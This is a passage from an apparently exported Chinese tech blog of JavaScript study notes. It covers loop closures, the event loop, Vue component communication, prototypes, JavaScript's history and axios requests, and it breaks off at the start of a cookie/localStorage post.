<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span> ;i++)&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span>=&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i);</span><br><span class="line">    &#125;,<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// setTimeout是过一段时间执行，结果打印出5个5，在for循环结束后i的值为5，setTimeout作为循环体，会等到for循环执行完后，才会打印</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i)</span><br><span class="line">    &#125;,<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将var换成let，就会打印出0,1,2,3,4</span></span><br></pre></td></tr></table></figure>
<h3 id="break和continue语句"><a href="#break和continue语句" class="headerlink" title="break和continue语句"></a>break和continue语句</h3><p>两者都具有跳转作用，可以让代码不按既有的顺序执行。</p>
<p>break 是跳出离它最近的一个循环。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">  <span class="keyword">if</span> (i === <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;  <span class="comment">// 执行到i等于3，就会跳出循环。 打印出0,1,2,3</span></span><br></pre></td></tr></table></figure></p>
<p>continue 会立即跳出当前的一次循环，返回循环结构的头部，开始下一轮循环。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (i &lt; <span class="number">100</span>)&#123;</span><br><span class="line">  i++;</span><br><span class="line">  <span class="keyword">if</span> (i % <span class="number">2</span> === <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'i 当前为：'</span> + i);</span><br><span class="line">&#125;  <span class="comment">// 打印出i为奇数的值，i为偶数时，直接进入下一轮循环</span></span><br></pre></td></tr></table></figure></p>
<h3 id="label标签"><a href="#label标签" class="headerlink" title="label标签"></a>label标签</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    a:<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个代码块里有一个label，a是一个label，语句是1<strong>*它并不是一个对象</strong></p>
<p>label标签通常与 break语句 和 continue语句 配合使用，跳出特定循环</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">foo: &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">break</span> foo;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'本行不会输出'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">2</span>);  <span class="comment">// 当执行到break foo就会跳出代码块，打印出1,2</span></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>JS引擎执行机制</title>
    <url>/2018/08/02/JS%E5%BC%95%E6%93%8E%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>从JS是一门单线程语言讲起<br><a id="more"></a></p>
<h2 id="灵魂三问："><a href="#灵魂三问：" class="headerlink" title="灵魂三问："></a>灵魂三问：</h2><ul>
<li>为什么JS是一门单线程语言</li>
<li>为什么JS需要异步</li>
<li>JS单线程如何实现异步</li>
</ul>
<h3 id="为什么JS是一门单线程语言"><a href="#为什么JS是一门单线程语言" class="headerlink" title="为什么JS是一门单线程语言"></a>为什么JS是一门单线程语言</h3><p>如果说在浏览器中，JS是多线程的，有如下场景：</p>
<p>在浏览器中，有两个进程process1和process2，因为JS是多进程的，所以他们对同一个dom同时进行操作。process1删除了该dom，而process2编辑了该dom，同时下达两个矛盾的命令，浏览器如何执行？</p>
<h3 id="为什么JS需要异步"><a href="#为什么JS需要异步" class="headerlink" title="为什么JS需要异步"></a>为什么JS需要异步</h3><p>如果JS中不存在异步，只能自上而下按顺序执行，如果上一行解析需要很长时间，那么下面的代码就会被阻塞，对于用户而言阻塞就会导致页面卡死，进而影响用户体验</p>
<h3 id="JS单线程如何实现异步"><a href="#JS单线程如何实现异步" class="headerlink" title="JS单线程如何实现异步"></a>JS单线程如何实现异步</h3><p>通过事件循环（event loop），理解了该机制，也就明白了JS的执行机制</p>
<p>观察如下代码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">console.log(1)</span><br><span class="line"></span><br><span class="line">setTimeout(function()&#123;</span><br><span class="line">    console.log(2)</span><br><span class="line">&#125;, 0)</span><br><span class="line"></span><br><span class="line">console.log(3)</span><br></pre></td></tr></table></figure></p>
<p>浏览器会分别打印出：1 3 2</p>
<p>setTimeout里的函数并没有立即执行，而是延迟了一段时间，满足了一定条件后才去执行，这类代码叫做异步代码。所以按照上面代码可以将任务分成同步任务和异步任务，按照这种分类方式，JS的执行机制是：</p>
<ul>
<li>首先判断是同步还是异步，同步就进入主进程，异步就进入event table</li>
<li>异步任务在event table中注册函数，当满足触发条件后被推入事件队列</li>
<li>同步任务在进入主进程后一直执行，直到主进程空闲，才会去事件队列中查看是否有可执行的异步任务，如果有就推入主进程中</li>
</ul>
<p>但仅仅是上面这样就结束了吗？？？再看下面的代码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setTimeout(function()&#123;</span><br><span class="line">    console.log(&apos;定时器开始啦&apos;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">new Promise(function(resolve)&#123;</span><br><span class="line">    console.log(&apos;马上执行for循环啦&apos;);</span><br><span class="line">    for(var i=0;i&lt;10000;i++)&#123;</span><br><span class="line">        i == 99 &amp;&amp; resolve();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).then(function()&#123;</span><br><span class="line">    console.log(&apos;执行then函数啦&apos;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(&apos;代码执行结束&apos;);</span><br></pre></td></tr></table></figure></p>
<p>按照上面的理解去分析JS的执行机制：</p>
<ul>
<li>setTimeout是异步任务，进入event table里</li>
<li>new Promise是同步任务，放到主进程里，控制台打印：马上执行for循环啦</li>
<li>.then函数里的是异步任务，放到event table里</li>
<li>console.log是同步代码，放到主进程里，打印：代码执行结束<br>照这样打印出的顺序是：马上执行for循环啦—代码执行结束—定时器开始啦—执行then函数啦</li>
</ul>
<p>但是实际执行后的结果却是：马上执行for循环啦—代码执行结束—执行then函数啦—定时器开始啦</p>
<p>这么说按照同步任务和异步任务划分并不准确！！而准确的方式是（妈ma 咪mi 宏任务在前，微任务在后）</p>
<ul>
<li>宏任务（macro-task）：包括整体代码script、setTimeout、setInterval</li>
<li>微任务（micro-task）：Promise、process.nextTick</li>
</ul>
<p>按照这种方式，JS的执行机制是：</p>
<ul>
<li>执行一个宏任务，过程中遇到微任务，将它放到微任务的事件队列里</li>
<li>当前宏任务执行完成后，会去查看微任务的事件队列，并将里面的微任务一次执行完，然后才会进入下一个宏任务</li>
<li>重复上面的两个步骤</li>
</ul>
<p>下面再次分析第二段代码：</p>
<ul>
<li>首先执行script中的宏任务，遇到setTimeout，将它放到宏任务的事件队列里</li>
<li>遇到new Promise立即执行（它是同步的），打印：马上执行for循环啦</li>
<li>遇到then方法，是微任务，将它放到微任务的事件队列里</li>
<li>打印：代码执行结束</li>
<li>本轮宏任务执行完，查看微任务，发现有一个then方法里的函数，打印：执行then函数啦</li>
<li>到这儿本轮的事件循环（event loop）结束</li>
<li>进入下一轮循环，先执行一个宏任务，发现宏任务队列里有一个setTimeout函数，执行并打印：定时器开始啦</li>
</ul>
<p>于是，真正的代码执行顺序是：马上执行for循环啦—代码执行结束—执行then函数啦—定时器开始啦</p>
<h3 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout"></a>setTimeout</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setTimeout(function()&#123;</span><br><span class="line">    console.log(&apos;执行了&apos;)</span><br><span class="line">&#125;, 3000)</span><br></pre></td></tr></table></figure>
<p>我们一般会解释为3秒之后执行setTimeout里的函数，但这种说法不严谨。准确来说，3秒后，setTimeout里的函数会被推到事件队列里（event queue），而事件队列里的任务只有在主线程空闲时才会去执行</p>
<p>所以要满足<1> 3秒后; <2> 主线程空闲; 同时满足时才会在3秒后执行该函数</2></1></p>
<p>如果主线程任务很多，执行时间超过了3秒，比方执行了5秒，那这个函数也只能在5秒后被执行</p>
]]></content>
      <tags>
        <tag>单线程</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue组件通信</title>
    <url>/2018/08/11/Vue%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>父子、兄弟组件间传值方式<br><a id="more"></a></p>
<h2 id="父组件传数据给子组件"><a href="#父组件传数据给子组件" class="headerlink" title="父组件传数据给子组件"></a>父组件传数据给子组件</h2><p>父组件向下传递属性给子组件，子组件通过props接收并绑定该属性<br><img src="https://i.loli.net/2018/08/11/5b6edbdfc3e85.png" alt="父传子]"></p>
<h2 id="子组件发事件给爸爸"><a href="#子组件发事件给爸爸" class="headerlink" title="子组件发事件给爸爸"></a>子组件发事件给爸爸</h2><p>子组件通过$emit向上发出事件，爸爸监听该事件并定义相关方法<br><img src="https://i.loli.net/2018/08/11/5b6edbec1c6c8.png" alt="子发事件]"></p>
<h2 id="兄弟间组件传值"><a href="#兄弟间组件传值" class="headerlink" title="兄弟间组件传值"></a>兄弟间组件传值</h2><p>1、创建一个事件总线，demo中的eventBus作为通信桥梁<br>2、在需要传值的组件中用bus.$emit(‘xxx’)触发一个自定义事件，并传递参数<br>3、在需要接收数据的组件中用bus.$on(‘xxx’, xxx-data =&gt; {})监听自定义事件，并在回调函数中处理传递过来的参数</p>
<p>完成下面需求：做一个点击事件，点击组件a的click，组件b中得到a的信息，即同级元素之间互相传值<br><img src="https://i.loli.net/2018/08/13/5b70f45ba71ec.png" alt="兄弟间传值]"></p>
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>JS对象分类</title>
    <url>/2022/03/14/JS%E5%AF%B9%E8%B1%A1%E5%88%86%E7%B1%BB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Square</span>(<span class="params">width</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.width = width;</span><br><span class="line">&#125;</span><br><span class="line">Square.prototype.getArea = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.width * <span class="keyword">this</span>.width;</span><br><span class="line">&#125;</span><br><span class="line">Square.prototype.getLength = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.width * <span class="number">4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> square = <span class="keyword">new</span> Square(<span class="number">5</span>)  <span class="comment">// 使用new操作调用构造函数，创建一个对象</span></span><br></pre></td></tr></table></figure>
<h4 id="构造函数Square"><a href="#构造函数Square" class="headerlink" title="构造函数Square"></a>构造函数Square</h4><ul>
<li>Square函数本身负责给对象本身增加自身属性</li>
<li>Square.prototype负责创建对象的共有属性</li>
</ul>
<h4 id="new-Square-自动帮你做了四件事"><a href="#new-Square-自动帮你做了四件事" class="headerlink" title="new Square 自动帮你做了四件事"></a>new Square 自动帮你做了四件事</h4><ol>
<li>自动创建了一个空对象</li>
<li>自动为这个空对象关联原型，原型地址为Square.prototype</li>
<li>自动将空对象作为 this关键字 运行构造函数</li>
<li>自动 return this</li>
</ol>
<h4 id="规范"><a href="#规范" class="headerlink" title="规范"></a>规范</h4><ul>
<li>构造函数，首字母大写</li>
<li>被构造出来的对象，首字母小写</li>
<li>new 后面的函数，使用名词形式 eg: new Person()、new Circle()</li>
</ul>
<h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Circle</span>(<span class="params">radius</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.radius = radius;</span><br><span class="line">&#125;</span><br><span class="line">Circle.prototype.getArea = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.pow(<span class="keyword">this</span>.radius, <span class="number">2</span>) * <span class="built_in">Math</span>.PI;</span><br><span class="line">&#125;</span><br><span class="line">Circle.prototype.getLength = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.radius * <span class="number">2</span> * <span class="built_in">Math</span>.PI;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> circle = <span class="keyword">new</span> Circle(<span class="number">5</span>);</span><br><span class="line">circle.radius</span><br><span class="line">circle.getArea();</span><br><span class="line">circle.getLength();</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="原型公式-JS里唯一的一个公式"><a href="#原型公式-JS里唯一的一个公式" class="headerlink" title="原型公式(JS里唯一的一个公式)"></a>原型公式(JS里唯一的一个公式)</h2><h4 id="规律"><a href="#规律" class="headerlink" title="规律"></a>规律</h4><ul>
<li>let obj = new Object() 原型是 Object.prototype</li>
<li>let arr = new Array() 原型是 Array.prototype</li>
<li>let square = new Square() 原型是 Square.prototype</li>
<li>let fn = new Function() 原型是 Function.prototype<h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4></li>
<li>你是谁构造的，你的原型就是谁的 prototype属性所对应的对象<h4 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h4></li>
<li>对象.<strong>proto</strong> === 其构造函数.prototype</li>
</ul>
<hr>
<h2 id="JS中的类"><a href="#JS中的类" class="headerlink" title="JS中的类"></a>JS中的类</h2><h4 id="类型-VS-类"><a href="#类型-VS-类" class="headerlink" title="类型 VS 类"></a>类型 VS 类</h4><ul>
<li>类型是JS数据的分类，包含7种数据类型（string、number、bool、symbol、undefined、null、object）</li>
<li>类是针对对象的分类，常见的有（Array、Function、Date）<h4 id="为什么对象需要分类"><a href="#为什么对象需要分类" class="headerlink" title="为什么对象需要分类"></a>为什么对象需要分类</h4></li>
<li>有很多对象拥有一样的属性和行为（函数），需要把他们归为一类，如 square1 和 square2，这样创建类似对象的时候就很方便</li>
<li>还有很多对象拥有其他的属性和行为，所以就需要不同的分类。比如 Square / Circle / Rect 就是不同的分类，Array / Function 也是不同的分类</li>
</ul>
<h4 id="数组对象"><a href="#数组对象" class="headerlink" title="数组对象"></a>数组对象</h4><ul>
<li><p>定义一个数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>); <span class="comment">// 数组包含元素1,2,3</span></span><br><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>);  <span class="comment">// 数组长度为3</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>数组对象的自身属性<br>‘0’ ‘1’ ‘2’ ‘length’，属性名没有数字，只有字符串</p>
</li>
<li>数组对象的共用属性<br>‘push’ ‘pop’ ‘join’ ‘shift’ ‘unshift’</li>
</ul>
<h4 id="函数对象"><a href="#函数对象" class="headerlink" title="函数对象"></a>函数对象</h4><ul>
<li><p>定义一个函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">x,y</span>) </span>&#123;<span class="keyword">return</span> x+y&#125;</span><br><span class="line"><span class="keyword">let</span> fn2 = <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">x,y</span>) </span>&#123;<span class="keyword">return</span> x+y&#125;</span><br><span class="line"><span class="keyword">let</span> fn = <span class="function">(<span class="params">x,y</span>) =&gt;</span> x+y</span><br><span class="line"><span class="keyword">let</span> fn = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'return x+y'</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>函数对象的自身属性<br>‘name’ ‘length’</p>
</li>
<li>函数对象的共用属性<br>‘call’ ‘apply’ ‘bind’</li>
</ul>
<hr>
<h2 id="ES6-class新语法"><a href="#ES6-class新语法" class="headerlink" title="ES6 class新语法"></a>ES6 class新语法</h2><p>用class重写circle<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(radius)&#123;</span><br><span class="line">        <span class="keyword">this</span>.radius = radius</span><br><span class="line">    &#125;</span><br><span class="line">    getArea()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Math</span>.pow(<span class="keyword">this</span>.radius,<span class="number">2</span>) * <span class="built_in">Math</span>.PI</span><br><span class="line">    &#125;</span><br><span class="line">    getLength()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.radius * <span class="number">2</span> * <span class="built_in">Math</span>.PI</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> circle = <span class="keyword">new</span> Circle(<span class="number">5</span>)</span><br><span class="line">circle.radius</span><br><span class="line">circle.getArea</span><br><span class="line">circle.getLength</span><br></pre></td></tr></table></figure></p>
<h2 id="JS终极一问"><a href="#JS终极一问" class="headerlink" title="JS终极一问"></a>JS终极一问</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. window 是谁构造的</span><br><span class="line"></span><br><span class="line">Window</span><br><span class="line">可通过 constructor属性 查看构造者</span><br><span class="line">window.__proto__ === Window.prototype</span><br><span class="line"></span><br><span class="line">2.window.Object 是谁构造的</span><br><span class="line"></span><br><span class="line">window.Function</span><br><span class="line">因为所有函数都是由 window.Function 构造出来的</span><br><span class="line">window.Object.constructor === window.Function</span><br><span class="line"></span><br><span class="line">3. window.Function 是谁构造的</span><br><span class="line"></span><br><span class="line">window.Function</span><br><span class="line">因为所有函数都是由window.function构造的</span><br><span class="line">自己构造自己？</span><br><span class="line">浏览器构造了Function，然后指定它的构造者是自己</span><br></pre></td></tr></table></figure>
<h2 id="问答"><a href="#问答" class="headerlink" title="问答"></a>问答</h2><ol>
<li>关于 「原型」 ，正确的是</li>
</ol>
<ul>
<li>「x 的原型」等价于「x.<strong>proto</strong> 所指的对象」 ，有时为了方便，我们可以认为「x 的原型」等价于「x.<strong>proto</strong> 」</li>
<li>一个对象的原型指的是这个对象与其他同类对象的公有属性的集合，比如 obj1 和 ob2 同时拥有 toString / valueOf，那么 toString / valueOf 等属性组成的对象，就是 obj1 和 obj2 的原型，这个原型的地址一般储存在构造函数的 prototype 里</li>
<li>x.<strong>proto</strong>和 Object.prototype 存储着同一个对象的地址，这个对象就是 x 的原型</li>
<li>每个对象都有原型，但除了「根对象 Object.prototype」比较特殊，Object.prototype 这个对象的原型为空 null</li>
</ul>
<ol start="2">
<li>关于 prototype 属性，正确的有</li>
</ol>
<ul>
<li>所有函数一出生就有一个 prototype 属性（除了箭头函数）</li>
<li>所有 prototype 一出生就有一个 constructor 属性</li>
<li>所有 constructor 属性一出生就保存了对应的函数的地址</li>
<li>如果一个函数不是构造函数，它依然拥有 prototype 属性，只不过这个属性暂时没什么用</li>
<li>如果一个对象不是函数，那么这个对象一般来说没有 prototype 属性，但这个对象一般一定会有 <strong>proto</strong> 属性</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>JS的诞生</title>
    <url>/2022/03/09/JS%E7%9A%84%E8%AF%9E%E7%94%9F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
<li>李爵士发明了HTML</li>
<li>赖先生发明了CSS</li>
<li>布兰登发明了JS</li>
</ul>
<h2 id="JS简介"><a href="#JS简介" class="headerlink" title="JS简介"></a>JS简介</h2><ul>
<li>JavaScript是一种解释性脚本语言（代码不进行预编译），主要用来向HTML页面添加交互行为。</li>
<li>可以直接嵌入HTML页面，但写成单独的js文件有利于结构和行为的分离。</li>
<li>由ECMA（欧洲电脑制造商协会）通过ECMAScript实现语言的标准化。它被世界上的绝大多数网站所使用，也被世界主流浏览器（Chrome、IE、Firefox、Safari、Opera）支持。<h2 id="JS用途"><a href="#JS用途" class="headerlink" title="JS用途"></a>JS用途</h2>JavaScript常用来完成以下任务：</li>
</ul>
<ol>
<li>嵌入动态文本于HTML页面</li>
<li>对浏览器事件作出响应</li>
<li>读写HTML元素</li>
<li>在数据被提交到服务器之前验证数据</li>
<li>检测访客的浏览器信息</li>
<li>控制cookie，包括创建和修改等<h2 id="JS诞生"><a href="#JS诞生" class="headerlink" title="JS诞生"></a>JS诞生</h2></li>
</ol>
<ul>
<li>1994年，互联网刚兴起，网景公司（Netscape）发布了Navigator浏览器0.9版，但这个版本的浏览器只能用来浏览，不具备与访问者互动的能力。因此网景公司急需一种网页脚本语言，使得浏览器可以与网页互动。</li>
<li>1995年，Sun公司将Oak语言更名为Java并推向市场，并宣称“Write Once, Run Anywhere”。网景公司深受Java的影响，网景公司高层都非常信赖Java，所以网景公司决定要蹭Java的流量，新开发一门语言，用于浏览器的交互。</li>
<li>1995年4月，BrendanEich（布兰登·艾奇） 加入网景公司，被指定成了“新语言”的设计师，并且要求这个“新语言”要和Java足够的相似（面向对象思想），但是要比Java能够更加简单地上手。Brenden花了10天时间便把这门“新语言”的最初版本设计了出来，命名为JavaScript，对外宣称JavaScript是Java的补充。</li>
<li>设计思路</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（1）借鉴C语言的基本语法；</span><br><span class="line">（2）借鉴Java语言的数据类型和内存管理；</span><br><span class="line">（3）借鉴Scheme语言，将函数提升到&quot;第一等公民&quot;（first class）的地位；</span><br><span class="line">（4）借鉴Self语言，使用基于原型（prototype）的继承机制。</span><br></pre></td></tr></table></figure>
<h2 id="JS命名"><a href="#JS命名" class="headerlink" title="JS命名"></a>JS命名</h2><ul>
<li>最初为了紧跟Java（有一种咖啡叫Java），这门“新语言”被命名为Mocha（有一种咖啡叫Mocha）</li>
<li>但由于商标的问题，以及网景公司很多产品已经使用了“Live”作为产品名前缀，Mocha更名为LiveScript。</li>
<li>由于网景公司与Sun公司有一些合作，Sun把Java这个商标授权给了网景公司，于是LiveScript更名为JavaScript。</li>
<li>Mocha摩卡 =&gt; LiveScript =&gt; JavaScript</li>
</ul>
<h2 id="JavaScript与Java的关系"><a href="#JavaScript与Java的关系" class="headerlink" title="JavaScript与Java的关系"></a>JavaScript与Java的关系</h2><ul>
<li>JavaScript的基础语法和对象体系，是模仿Java而设计的。</li>
<li>JavaScript语言的函数是一种独立的数据类型以及基于原型对象的继承链，是与java语法最大的两点区别。</li>
<li>JavaScript不需要编译，由解释器直接执行。</li>
</ul>
<h2 id="JS与ECMAScript的关系"><a href="#JS与ECMAScript的关系" class="headerlink" title="JS与ECMAScript的关系"></a>JS与ECMAScript的关系</h2><ul>
<li>ECMAScript是纸上的标准，JS是浏览器的实现</li>
<li>纸上标准往往落后于浏览器，先实现，再写进标准</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>axios的使用</title>
    <url>/2018/08/23/axios%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>基于Vue搭建CNODE社区<br><a id="more"></a></p>
<h2 id="什么是axios"><a href="#什么是axios" class="headerlink" title="什么是axios"></a>什么是axios</h2><p>axios 是一个基于 promise 的 HTTP 库，可以用在浏览器和 node.js 中，它本身具有以下特征：</p>
<ul>
<li>从浏览器中创建XMLHttpRequest</li>
<li>从 nodejs 发出http请求</li>
<li>支持 Promise API</li>
<li>拦截请求和响应</li>
<li>转换请求和响应数据</li>
<li>取消请求</li>
<li>自动转换JSON数据</li>
<li>客户端支持防止 CSRF/XSRF</li>
</ul>
<h2 id="在Vue中使用"><a href="#在Vue中使用" class="headerlink" title="在Vue中使用"></a>在Vue中使用</h2><h3 id="get请求"><a href="#get请求" class="headerlink" title="get请求"></a>get请求</h3><p>1、安装<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install axios</span><br></pre></td></tr></table></figure></p>
<p>2、引入加载<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import axios from &apos;axios&apos;</span><br></pre></td></tr></table></figure></p>
<p>3、将axios全局挂载到Vue原型上<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Vue.prototype.$http = axios;  // 这样就可以直接使用this.$http发送请求</span><br></pre></td></tr></table></figure></p>
<p>4、发送请求（以CNODE社区API为例）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用传统的function：</span><br><span class="line">getData()&#123;</span><br><span class="line">    var self = this;  // 传统的function需要将this赋值给一个新的变量</span><br><span class="line">    this.$http.get(&apos;https://cnodejs.org/api/v1/topics&apos;)</span><br><span class="line">        .then(function (res) &#123;</span><br><span class="line">            // 如果直接使用this.items = res.data.data 会出错，因为此处的this指向的不是当前vue实例</span><br><span class="line">            self.items = res.data.data</span><br><span class="line">            console.log(res.data.data)</span><br><span class="line">        &#125;)</span><br><span class="line">        .catch(function (err) &#123;</span><br><span class="line">            console.log(err)</span><br><span class="line">        &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ES6箭头函数的写法</span><br><span class="line">getData()&#123;</span><br><span class="line">    this.$http.get(&apos;https://cnodejs.org/api/v1/topics&apos;)</span><br><span class="line">        .then(res =&gt;&#123;  // 可以直接使用this，因为箭头函会继承它父类的this</span><br><span class="line">            this.items = res.data.data</span><br><span class="line">            console.log(res)</span><br><span class="line">        &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>两种传递参数的形式：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">推荐：（都是CNODE官方提供的API）</span><br><span class="line">axios.get(&apos;url&apos;, &#123;</span><br><span class="line">    params: &#123;</span><br><span class="line">        page: 1,  // 页码</span><br><span class="line">        limit: 10  // 每页显示的数量</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">将参数直接写在地址后面：</span><br><span class="line">axios.get(&apos;https://cnodejs.org/api/v1/topics?page=1&amp;limit=15&apos;)</span><br></pre></td></tr></table></figure></p>
<h3 id="post请求"><a href="#post请求" class="headerlink" title="post请求"></a>post请求</h3><p>POST传递数据有两种格式：</p>
<ul>
<li>form-data?page=1&amp;limit=10</li>
<li>x­www­form­urlencoded { page: 1,limit: 10 }</li>
</ul>
<p>但因为在axios中post请求接收的参数必须是form-data的格式，所以需要用到一个qs插件来转换参数格式<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">首先 npm install qs</span><br><span class="line">qs.stringify可以将格式转换成form-data的形式</span><br><span class="line"></span><br><span class="line">postData()&#123;</span><br><span class="line">    this.$http.post(&apos;url&apos;,qs.stringify(&#123;</span><br><span class="line">        page:1,</span><br><span class="line">        limit:10</span><br><span class="line">    &#125;)).then(res=&gt;&#123;</span><br><span class="line">        this.items = res.data.data;</span><br><span class="line">        console.log(res)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <tags>
        <tag>axios</tag>
      </tags>
  </entry>
  <entry>
    <title>cookie、session及localStorge</title>
    <url>/2018/08/01/cookie%E3%80%81session%E5%8F%8AlocalStorge/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>说说cookie和localStorage的区别吧！这个几乎每次面试都会被提一嘴的问题<br><a id="more"></a></p>
